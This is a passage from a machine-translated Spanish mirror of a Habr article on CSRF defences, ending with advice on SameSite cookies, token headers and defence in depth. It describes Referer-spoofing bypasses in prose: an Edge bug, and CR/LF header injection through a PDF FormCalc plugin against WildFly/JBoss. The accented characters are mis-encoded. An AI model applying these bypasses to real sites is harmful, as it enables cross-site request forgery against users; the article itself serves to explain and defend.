<br><br>  La √∫ltima opci√≥n para evitar la protecci√≥n CSRF se basa en Referer.  Hay un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">error en el</a> navegador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Microsoft Edge</a> , que a√∫n no est√° solucionado y le permite falsificar el valor de Referer.  Pero, desafortunadamente, funciona solo para solicitudes GET.  Si el backend atacado no distingue GET de POST, entonces este error puede ser explotado. <br><br>  Si a√∫n necesitamos POST, entonces hay un peque√±o truco.  Podemos enviar el encabezado de referencia utilizando el complemento PDF y FormCalc. <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br>  Hace aproximadamente un a√±o, era posible usar el complemento PDF para enviar cualquier encabezado en general, incluido el host, pero Adobe cerr√≥ esta posibilidad creando una lista negra de encabezados.  Es decir, si especificamos Referer en el encabezado, entonces este encabezado simplemente no ir√°. <br><br>  En general, FormCalc nos permite enviar legalmente cualquier tipo de contenido.  Si insertamos caracteres de retorno de cartucho y avance de l√≠nea, podemos agregar encabezados adicionales a la solicitud. <br><br>  ¬øQu√© sucede si implementamos el encabezado <code>Referer http://example.com</code> ? <br><br>  Est√° claro que no est√° en la lista negra y se enviar√° al backend un encabezado con el nombre <code>Referer http://example.com</code> . <br><br>  Algunos servidores, como WildFly o Jboss, tratan el <strong>espacio</strong> como el final del nombre del encabezado HTTP, es decir, los dos puntos ` <strong>:</strong> `.  Por lo tanto, dichos servidores ver√°n que Referer lleg√≥ a ellos con el valor <code>http://example.com</code> .  Entonces reemplazaremos a Referer. <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br>  Esta es la tabla resumen.  Las columnas proporcionan protecci√≥n contra CSRF y las filas proporcionan soluciones alternativas.  En cada celda, se indican los navegadores en los que funciona este m√©todo: <br><br><ul><li>  Todos los medios para todos los navegadores; <br></li><li>  Todos * significa navegadores que no son compatibles con las cookies de SameSite, es decir  Todo excepto Chrome y Opera. <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br>  La opci√≥n m√°s cardinal y funcional para protegerse contra los ataques CSRF es deshacerse de las cookies y usar el encabezado con tokens. <br><br>  Pero si a√∫n no est√° listo para renunciar a las cookies para administrar su sesi√≥n de usuario: <br><br><ul><li>  Modele amenazas y verifique la implementaci√≥n de la protecci√≥n CSRF <strong><em>(consulte la tabla Resumen).</em></strong> <br></li><li>  Implemente las cookies de SameSite.  Ahora solo son compatibles dos navegadores, pero en el futuro, probablemente, habr√° m√°s. <br></li><li>  Combina varias defensas CSRF: defensa en profundidad. <br></li><li>  Solicite al usuario una contrase√±a para realizar acciones cr√≠ticas. <br></li><li>  Dar archivos descargados por el usuario desde un dominio separado. <br></li></ul><br><blockquote>  En menos de seis meses, y la pr√≥xima alta carga en un mes: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Highload ++ Siberia</a> . <br><br>  Queremos llamar su atenci√≥n sobre algunos de los informes seleccionados: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Estoy llorando por todos!</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">C√≥mo integramos los sistemas de pago sin usar nuestra propia facturaci√≥n</a> / Anton Rusakov. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">njs: secuencias de comandos de JavaScript nativas en nginx</a> / Dmitry Volintsev. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PG Saga: cambios de datos dependientes en varios servicios sin compromisos de dos fases y dependencias sincr√≥nicas</a> / Konstantin Evteev. <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es412855/">https://habr.com/ru/post/es412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es412845/index.html">Clasificaci√≥n de las emociones: en el coraz√≥n de la computaci√≥n emocional.</a></li>
<li><a href="../es412847/index.html">graphql: optimizaci√≥n de consultas de bases de datos</a></li>
<li><a href="../es412849/index.html">TOP 8 libros que vale la pena leer este verano</a></li>
<li><a href="../es412851/index.html">OutOfMemory y GDI + a veces no tienen OutOfMemory</a></li>
<li><a href="../es412853/index.html">Video de Badoo Techleads Meetup # 3: sobre delegaci√≥n, incorporaci√≥n, negocios y entrevistas de TI</a></li>
<li><a href="../es412859/index.html">Autenticaci√≥n de dos factores en Windows y encriptaci√≥n de datos sin una autoridad de certificaci√≥n y dominio</a></li>
<li><a href="../es412861/index.html">Crear un mapa de ruta de usuario para dummies</a></li>
<li><a href="../es412863/index.html">Dialogflower - Google Dialogflow para Yandex Alice</a></li>
<li><a href="../es412865/index.html">C√≥mo disparar una c√°mara Motion Eye en el Sony Xperia XZ2</a></li>
<li><a href="../es412867/index.html">C√≥mo compilar un archivo COM de DOS con el compilador GCC</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>